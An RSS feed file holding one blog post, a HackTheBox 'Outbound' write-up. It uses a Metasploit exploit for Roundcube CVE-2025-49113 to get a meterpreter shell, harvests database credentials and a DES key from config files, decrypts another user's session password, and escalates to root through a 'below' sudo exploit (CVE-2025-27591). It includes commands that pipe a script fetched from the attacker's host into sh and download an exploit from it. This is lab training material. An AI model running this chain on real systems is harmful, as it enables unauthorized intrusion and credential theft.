@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>HackTheBox on Maaroof Khan - Blog</title>
+    <link>https://Maaroof-Khan10.github.io/tags/hackthebox/</link>
+    <description>Recent content in HackTheBox on Maaroof Khan - Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 Aug 2025 16:46:16 +0530</lastBuildDate><atom:link href="https://Maaroof-Khan10.github.io/tags/hackthebox/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Outbound [Write-up] - HackTheBox</title>
+      <link>https://Maaroof-Khan10.github.io/posts/2/</link>
+      <pubDate>Sun, 10 Aug 2025 16:46:16 +0530</pubDate>
+      
+      <guid>https://Maaroof-Khan10.github.io/posts/2/</guid>
+      <description>&lt;p&gt;Hello everyone, and welcome to my first-ever write-up!&lt;/p&gt;
+&lt;p&gt;This box seemed pretty straightforward at first, but it wasn&amp;rsquo;t long before it had me begging for mercy. Let&amp;rsquo;s dive in!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I booted up the &amp;ldquo;Outbound&amp;rdquo; machine, ready to see what this bad boy had to offer. We&amp;rsquo;re handed credentials right from the start (&lt;code&gt;tyler / LhKL1o9Nm3X2&lt;/code&gt;), which almost certainly means a login portal awaits.&lt;/p&gt;
+&lt;h3 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h3&gt;
+&lt;p&gt;As is tradition with any HackTheBox machine, the first step is always &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Hello everyone, and welcome to my first-ever write-up!&lt;/p&gt;
+&lt;p&gt;This box seemed pretty straightforward at first, but it wasn&amp;rsquo;t long before it had me begging for mercy. Let&amp;rsquo;s dive in!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I booted up the &amp;ldquo;Outbound&amp;rdquo; machine, ready to see what this bad boy had to offer. We&amp;rsquo;re handed credentials right from the start (&lt;code&gt;tyler / LhKL1o9Nm3X2&lt;/code&gt;), which almost certainly means a login portal awaits.&lt;/p&gt;
+&lt;h3 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h3&gt;
+&lt;p&gt;As is tradition with any HackTheBox machine, the first step is always &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -T5 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I ran a &lt;code&gt;T5&lt;/code&gt; scan for some quick results.&lt;/p&gt;
+&lt;p&gt;And here’s what we got:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-08-10 16:54 IST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 4.31 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have a web server on port 80 and SSH on port 22. Seeing SSH usually means we&amp;rsquo;ll be using it later. Now, let&amp;rsquo;s get this box to spill some beans with a more aggressive scan.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -Pn -p 22,80 -sC -sV 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output was revealing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2025-08-10 17:00 IST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    nginx 1.24.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Did not follow redirect to http://mail.outbound.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: nginx/1.24.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The web server redirects to &lt;code&gt;http://mail.outbound.htb&lt;/code&gt;, so let&amp;rsquo;s add that to our &lt;code&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nano /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I added the following line:
+&lt;code&gt;10.10.11.77     outbound.htb mail.outbound.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Time to check out this mailing service.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;roundcube_login.png&#34; alt=&#34;Roundcube Login Page&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;roundcube-exploit&#34;&gt;Roundcube Exploit&lt;/h3&gt;
+&lt;p&gt;Here it is, the moment we&amp;rsquo;ve all been waiting for: a login page! Let&amp;rsquo;s use the credentials we were given. Success! We&amp;rsquo;re in, but Tyler&amp;rsquo;s inbox is bone dry. Guess he isn&amp;rsquo;t too popular.&lt;/p&gt;
+&lt;p&gt;A quick look at the &amp;ldquo;About&amp;rdquo; section reveals the software version.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;roundcube_about.png&#34; alt=&#34;Roundcube About Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;re dealing with &lt;strong&gt;Roundcube Webmail 1.6.10&lt;/strong&gt;. Before diving down a Google rabbit hole for exploits, my first move is always to fire up &lt;code&gt;metasploit&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search roundcube
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And what do you know, we hit the jackpot! An exploit for a version less than 1.6.1 is available, which is close enough to investigate. The exact CVE is &lt;code&gt;CVE‑2025‑49113&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;metasploit_exp.png&#34; alt=&#34;Metasploit Modules&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Time to exploit (rubs hands).
+Used the following steps to run the exploit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set RHOSTS mail.outbound.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set LHOST tun0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set USERNAME tyler
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set PASSWORD LhKL1o9Nm3X2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And just like that, we have a meterpreter shell!&lt;/p&gt;
+&lt;h3 id=&#34;finding-juicy-details-post-exploitation&#34;&gt;Finding Juicy Details (Post-Exploitation)&lt;/h3&gt;
+&lt;p&gt;My first order of business on a new machine is always to hunt for passwords and config files.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find /var -name &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;config&amp;#34;&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This led me to &lt;code&gt;/var/www/html/roundcube/config&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Peeking into this folder gave away the file &lt;code&gt;config.inc.php&lt;/code&gt; and it contained some spicy details
+Here is a sneak peak:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db_dsnw&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;des_key&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rcmail-!24ByteDESkey*Str&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We&amp;rsquo;ve got the MySQL password and a DES key. This will definitely come in handy. Let&amp;rsquo;s check into mysql and see what we get.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mysql -u roundcube -pRCDBPass2025 roundcube
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once we are in we can make basic queries (The responses take their sweet time to show up so be patient here)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use roundcube;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; tables;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; users;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;session&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box&#34;&gt;This part in my opinion was the trickiest of all in this box&lt;/h4&gt;
+&lt;p&gt;The &lt;code&gt;session&lt;/code&gt; table gives us a bunch of base64 encoded session details&lt;/p&gt;
+&lt;p&gt;Using CyberChef, we can decode this data and find something very interesting.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;cyberchef-jacob.png&#34; alt=&#34;CyberChef showing Jacob&amp;rsquo;s credentials&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We found another user, &lt;code&gt;jacob&lt;/code&gt;, and more importantly, his password! The catch? It&amp;rsquo;s encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s how to decrypt the password:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Convert the password from base64 to hex&lt;/li&gt;
+&lt;li&gt;Copy the first 8 bytes (They will be your IV - &lt;code&gt;Initialization Vector&lt;/code&gt; for decryption)&lt;/li&gt;
+&lt;li&gt;Enter the first 8 bytes into the IV field (keep it hex) in cyberchef &lt;strong&gt;Triple DES Decrypt&lt;/strong&gt;, along with the des key (set it to utf-8 first)&lt;/li&gt;
+&lt;li&gt;Paste the rest of the hex into the input part (Except the first 8 bytes we used)&lt;/li&gt;
+&lt;li&gt;Get the password&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Here is the decrypted password we get:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;password_decrypt.png&#34; alt=&#34;CyberChef decrypting the password&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;Now that we have jacob in our control, let&amp;rsquo;s check this lad&amp;rsquo;s account shall we&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;su jacob
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Enter the password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /home/jacob/user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We&amp;rsquo;ve got the user flag!&lt;/p&gt;
+&lt;p&gt;Now that we are Jacob let&amp;rsquo;s check the home folder&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /home/jacob
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It had a mail folder which had a &lt;code&gt;INBOX&lt;/code&gt; folder which contained a file &lt;code&gt;jacob&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat jacob
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Gave us 2 mails,
+One contained the ssh credentials for jacob
+The other said:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;We have been experiencing high resource consumption on our main server.
+For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
+Please inform us immediately if you notice any irregularities.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;This is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh jacob@10.10.11.77
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now that we have user.txt and a massive clue from that mail lets check how we can escalate
+Lets use &lt;code&gt;LinPeas&lt;/code&gt; to find something (&lt;code&gt;sudo -l&lt;/code&gt; could also reveal information but linpeas might give additional details)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On your machine - where linpeas.sh resides&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On victim&amp;#39;s ssh shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -L &amp;lt;Your-HTB-IP&amp;gt;/linpeas.sh | sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As predicted we got this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User jacob may run the following commands on outbound:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ALL : ALL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can run the &lt;code&gt;below&lt;/code&gt; command as root without a password. A goldmine, if I ever saw one. This part took me the most time, as I was trying to exploit it manually without success.&lt;/p&gt;
+&lt;p&gt;A quick search online for a &lt;code&gt;below&lt;/code&gt; exploit leads to &lt;code&gt;CVE-2025-27591&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;I found a really cool python exploitation script &lt;a href=&#34;https://github.com/BridgerAlderson/CVE-2025-27591-PoC&#34;&gt;(Check it out)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I transferred the script to the victim machine and ran it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On your machine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# On the victim&amp;#39;s machine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;Your-HTB-IP&amp;gt;/exploit.py
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 exploit.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And Wham-Bam-Thank-You-Ma&amp;rsquo;am! We got root!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;cover.png&#34; alt=&#34;HTB PWNED&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now, just head to &lt;code&gt;/root&lt;/code&gt; and grab your well-earned flag.&lt;/p&gt;
+&lt;p&gt;Happy Hacking! And see you next week&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
